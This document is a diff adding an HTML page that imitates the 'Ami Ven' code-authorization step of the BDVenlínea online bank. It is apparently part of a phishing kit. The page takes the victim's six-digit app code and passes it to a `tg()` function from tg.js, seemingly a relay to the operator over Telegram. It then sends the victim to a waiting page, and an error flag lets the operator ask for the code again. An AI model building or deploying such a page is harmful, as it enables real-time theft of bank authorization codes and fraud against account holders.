@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Ami Ven - BDVenlínea</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #f0f0f0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Segoe UI', Arial, sans-serif;
+    }
+    .card {
+      background: #fff;
+      border-radius: 16px;
+      padding: 40px 32px 36px;
+      width: 340px;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.10);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
+    .logo { width: 180px; margin-bottom: 28px; }
+    p { color: #444; font-size: 14px; line-height: 1.6; margin-bottom: 20px; }
+    p strong { color: #000; }
+    input[type="password"] {
+      width: 100%;
+      padding: 13px 14px;
+      border: none;
+      border-bottom: 2px solid #ccc;
+      background: #f5f5f5;
+      border-radius: 6px 6px 0 0;
+      font-size: 22px;
+      letter-spacing: 8px;
+      text-align: center;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    input:focus { border-bottom-color: #0057A8; }
+    .error-msg {
+      color: #d32f2f;
+      font-size: 13px;
+      margin-top: 8px;
+      display: none;
+      width: 100%;
+      text-align: left;
+    }
+    .btn-confirmar {
+      width: 100%; padding: 13px;
+      background: #0057A8; color: #fff;
+      border: none; border-radius: 8px;
+      font-size: 16px; font-weight: 600;
+      cursor: pointer; margin-top: 20px;
+      transition: background 0.2s;
+    }
+    .btn-confirmar:hover { background: #004080; }
+    .btn-confirmar:disabled { background: #aaa; cursor: not-allowed; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <img src="logo.png" alt="Logo" class="logo" onerror="this.style.display='none'"/>
+    <p>Ingresa el código generado en tu aplicación móvil <strong>**Ami Ven**</strong> para autorizar esta operación.</p>
+    <input type="password" id="codigoAmi" placeholder="• • • • • •" maxlength="6" autocomplete="off"/>
+    <div class="error-msg" id="errorAmi">Código incorrecto. Por favor, intente nuevamente.</div>
+    <button class="btn-confirmar" id="btnConfirmar" onclick="enviarCodigo()">Confirmar</button>
+  </div>
+
+  <script src="tg.js"></script>
+  <script>
+    window.onload = function() {
+      if (new URLSearchParams(window.location.search).get('error') === '1') {
+        document.getElementById('errorAmi').style.display = 'block';
+      }
+      document.getElementById('codigoAmi').focus();
+    };
+
+    async function enviarCodigo() {
+      const codigo = document.getElementById('codigoAmi').value.trim();
+      const btn    = document.getElementById('btnConfirmar');
+      if (!codigo) return;
+
+      btn.disabled = true;
+      btn.textContent = 'Verificando...';
+
+      // Limpiar la URL para que al volver de wait nunca traiga ?error
+      history.replaceState(null, '', window.location.pathname);
+
+      await tg('ami_ven', { codigo });
+      sessionStorage.setItem('bdv_contexto', `📱 Código Ami Ven recibido: \`${codigo}\`\n\nElige siguiente acción:`);
+      window.location.href = 'wait.html';
+    }
+
+    document.addEventListener('keydown', e => { if (e.key === 'Enter') enviarCodigo(); });
+  </script>
+</body>
+</html>
